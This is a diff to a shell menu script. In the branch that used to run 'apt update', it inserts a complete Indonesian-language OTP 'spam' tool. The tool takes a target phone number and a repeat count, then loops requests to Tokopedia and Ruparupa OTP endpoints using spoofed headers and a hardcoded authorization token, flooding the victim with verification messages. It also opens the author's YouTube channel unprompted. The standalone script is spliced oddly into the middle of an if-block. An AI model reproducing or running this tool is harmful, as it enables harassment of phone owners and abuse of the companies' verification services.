@@ -319,7 +319,226 @@ fi
 
 if [ "$updt" -eq 7 ] || [ "$updt" -eq 07 ]; then
     # Add your code here for option 7
-    apt update
+    apt update -y 
+    #!/bin/bash
+
+# Creator :  Asasin Hack
+# YT=Asasin Hack
+# Recode
+
+M='\033[1;31m'
+H='\033[1;32m'
+K='\033[1;33m'
+U='\033[1;34m'
+P='\033[1;35m'
+C='\033[1;36m'
+W='\033[1;37m'
+A='\033[90m'
+
+MesinTik() {
+    text=$1
+    for (( i=0; i<${#text}; i++ )); do
+        echo -n "${text:$i:1}"
+        sleep $(echo "scale=4; $RANDOM/32767*0.05" | bc)
+    done
+    echo
+}
+
+MesinTik_2() {
+    text=$1
+    for (( i=0; i<${#text}; i++ )); do
+        echo -n "${text:$i:1}"
+        sleep $(echo "scale=4; $RANDOM/32767*0.02" | bc)
+    done
+    echo
+}
+
+Banner() {
+    MesinTik_2 "${C}
+  ____                         __        __    
+ / ___| _ __   __ _ _ __ ___   \ \      / /_ _ 
+ \___ \| '_ \ / _` | '_ \` _ \   \ \ /\ / / _\` |
+  ___) | |_) | (_| | | | | | |   \ V  V / (_| |
+ |____/| .__/ \__,_|_| |_| |_|    \_/\_/ \__,_|
+       |_|                                     
+                   ${W}Author:EXECUTOR LORDHOZOO 👸\n\t\t   YT : LORDHOZOO"
+}
+
+RupaRupa() {
+    echo
+    MesinTik "${C}\t SPAM RUPA RUPA"
+    MesinTik "${W}\t================"
+    echo
+    read -p "${C}MASUKKAN NOMOR TARGET${W} (${H} Ex :${C} 0812xxxx ${W}) : " number
+    read -p "${C}JUMLAH SPAM${W} (${H} Ex :${C} 3 ${W}) : " jumlah
+    echo
+    MesinTik_2 "${C}-------------- ${W}Starting${C} --------------"
+    echo
+    hitung=${#number}
+    
+    if [ $hitung -lt 9 ]; then
+        echo
+        echo "${M}Nomor Tidak Valid !"
+        exit 1
+    fi
+    
+    for (( x=0; x<jumlah; x++ )); do
+        {
+            headers_1=$(cat <<EOF
+{
+    "User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; AFTT Build/LVY48F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/49.0.2623.10",
+    "Accept": "application/json",
+    "Origin": "https://m.ruparupa.com",
+    "Referer": "https://m.ruparupa.com/my-account",
+    "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiYjMzZTk5NjctMjdhMy00ZjkxLWE2M2MtM2M4NzMyZTZhOTU2IiwiaWF0IjoxNTgwNjM2ODI0LCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.pC9EDy_79GIDd4NOJKZP2kH5EjPdUK5VGUn59CzsdG0",
+    "x-company-name": "odi"
+}
+EOF
+            )
+            
+            data_1=$(cat <<EOF
+{
+    "phone": "$number",
+    "email": "jejak@gmail.com",
+    "action": "register",
+    "password": ""
+}
+EOF
+            )
+            
+            headers_2=$(cat <<EOF
+{
+    "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiYjMzZTk5NjctMjdhMy00ZjkxLWE2M2MtM2M4NzMyZTZhOTU2IiwiaWF0IjoxNTgwNjM2ODI0LCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.pC9EDy_79GIDd4NOJKZP2kH5EjPdUK5VGUn59CzsdG0",
+    "x-company-name": "odi", 
+    "User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; AFTT Build/LVY48F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/49.0.2623.10",
+    "Origin": "https://m.ruparupa.com",
+    "referer": "https://m.ruparupa.com/verification?page=otp-choices",
+    "accept-encoding": "gzip, deflate, br" 
+}
+EOF
+            )
+            
+            data_2=$(cat <<EOF
+{
+    "phone": "$number",
+    "action": "register",
+    "channel": "chat",
+    "email": "",
+    "customer_id": "0",
+    "is_resend": 0
+}
+EOF
+            )
+            
+            url_1="https://wapi.ruparupa.com/auth/check-otp-auth"
+            url_2="https://wapi.ruparupa.com/auth/generate-otp"
+            
+            sending_1=$(curl -s -X POST "$url_1" -H "Content-Type: application/json" -d "$data_1" --header "$headers_1")
+            sending_2=$(curl -s -X POST "$url_2" -H "Content-Type: application/json" -d "$data_2" --header "$headers_2")
+            
+            if [[ "$sending_2" == *"tunggu 1x24 jam"* ]]; then
+                echo
+                echo "${W}Pengiriman Sudah Limit\nSilahkan Coba 1 x 24 Jam Lagi :)"
+                break
+            else
+                echo "${C}[${W}*${C}]${W} SPAM KE NOMOR ${C}$number${W} BERHASIL DIKIRIMKAN !"
+            fi
+        } || {
+            echo
+            echo "${M}Cek Koneksi JaringanMu kak hozoo imut 👸🔥!"
+            break
+        }
+    done
+}
+
+Tokped() {
+    echo
+    MesinTik "${C}\t SPAM TOKOPEDIA"
+    MesinTik "${W}\t================"
+    echo
+    read -p "${C}MASUKKAN NOMOR TARGET${W} (${H} Ex :${C} 0812xxxx ${W}) : " number
+    read -p "${C}JUMLAH SPAM${W} (${H} Ex :${C} 3 ${W}) : " jumlah
+    echo
+    MesinTik_2 "${C}-------------- ${W}Starting${C} --------------"
+    echo
+    
+    for (( x=0; x<jumlah; x++ )); do
+        {
+            headers=$(cat <<EOF
+{
+    "Connection": "keep-alive",
+    "Accept": "application/json, text/javascript, */*; q=0.01",
+    "Origin": "https://accounts.tokopedia.com",
+    "X-Requested-With": "XMLHttpRequest",
+    "User-Agent": "{acak}",
+    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+    "Accept-Encoding": "gzip, deflate"
+}
+EOF
+            )
+            
+            site=$(curl -s "https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn=$number&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D" -H "$headers")
+            search=$(echo "$site" | grep -oP '<input\ id=\"Token\"\ value=\"(.*?)\"\ type=\"hidden\">' | sed -n 's/.*value="\([^"]*\)".*/\1/p')
+            
+            data=$(cat <<EOF
+{
+    "otp_type": "116",
+    "msisdn": "$number",
+    "tk": "$search",
+    "email": "",
+    "original_param": "",
+    "user_id": "",
+    "signature": "",
+    "number_otp_digit": "6"
+}
+EOF
+            )
+            
+            sleep 30 # Jangan Di Rubah Nilai Sleepnya, Itu Udah Default.
+            
+            sending=$(curl -s -X POST "https://accounts.tokopedia.com/otp/c/ajax/request-wa" -H "Content-Type: application/json" -d "$data" --header "$headers")
+            
+            if [[ "$sending" == *"Anda sudah melakukan 3 kali pengiriman kode"* ]]; then
+                echo
+                echo "${W}Pengiriman Sudah Limit\nSilahkan Coba 25 - 60 Menit Lagi :)"
+                break
+            else
+                echo "${C}[${W}*${C}]${W} SPAM KE NOMOR ${C}$number${W} BERHASIL DIKIRIMKAN !"
+            fi
+        } || {
+            echo
+            echo "${M}Cek Koneksi JaringanMu !"
+            break
+        }
+    done
+}
+
+Spam() {
+    clear
+    echo -e "${C}Subscribe YT${W} AKU !${C} :)"
+    sleep 1.5
+    xdg-open "https://youtube.com/@hozoo999?si=2PbBCcUX3Wq8c7o_" >/dev/null 2>&1
+    clear
+    sleep 1.3
+    Banner
+    echo
+    echo
+    echo -e "${C}MENU${W} :"
+    echo -e "${C}\t[${W}1${C}]${W} SPAM TOKOPEDIA${C} ( ${H}Aktif${C} )"
+    echo -e "${C}\t[${W}2${C}]${W} SPAM RUPA-RUPA${C} ( ${M}NonAktif${C} )"
+    echo
+    
+    read -p "${C}PILIH MENU${W} ➤ ${C}" pilih
+    
+    case $pilih in
+        1) Tokped ;;
+        2) RupaRupa ;;
+        *) ;;
+    esac
+}
+
+# Main execution
+Spam
 fi
 
 if [ "$updt" -eq 8 ] || [ "$updt" -eq 08 ]; then
